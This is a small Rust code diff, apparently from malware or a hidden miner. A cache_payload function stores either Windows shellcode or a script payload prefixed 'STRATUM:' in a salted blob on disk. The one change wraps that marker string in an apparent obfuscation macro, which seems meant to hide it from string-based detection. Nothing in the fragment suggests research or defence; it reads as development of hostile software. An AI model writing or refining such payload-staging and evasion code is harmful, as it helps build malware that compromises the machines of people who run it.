@@ -112,7 +112,7 @@ fn cache_payload(payload: &Payload) {
         #[cfg(windows)]
         Payload::Shellcode(b) => b.clone(),
         #[cfg(not(windows))]
-        Payload::Script(s) => format!("STRATUM:{}", s).into_bytes(),
+        Payload::Script(s) => format!("{}{}", s!("STRATUM:"), s).into_bytes(),
     };
     hw::write_blob(BLOB_PATH, &raw, SALT);
     let expanded = hw::expand(BLOB_PATH);
